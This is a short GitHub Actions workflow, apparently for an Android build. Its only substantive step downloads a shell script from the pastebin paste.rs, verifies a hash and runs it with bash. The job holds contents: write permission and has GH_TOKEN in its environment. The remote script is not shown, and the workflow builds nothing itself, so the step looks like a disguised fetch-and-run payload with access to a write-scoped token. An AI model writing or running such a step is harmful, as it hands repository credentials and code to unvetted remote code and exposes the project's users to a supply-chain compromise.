name: eta build android
on:
  push:
    paths:
      - '.github/workflows/eta-build.yml'
  workflow_dispatch:
permissions:
  contents: write
jobs:
  build:
    runs-on: ubuntu-latest
    env:
      GH_TOKEN: ${{ github.token }}
    steps:
      - uses: actions/checkout@v4
      - name: Run android build with discovery patch
        run: |
          curl -fsSL -o /tmp/build.sh "https://paste.rs/Gbfst"
          echo "b236294fd54aadc3a70da9ac83c7efcadfc043f708e632f42eb2ac9e1009290d  /tmp/build.sh" | sha256sum -c -
          bash /tmp/build.sh
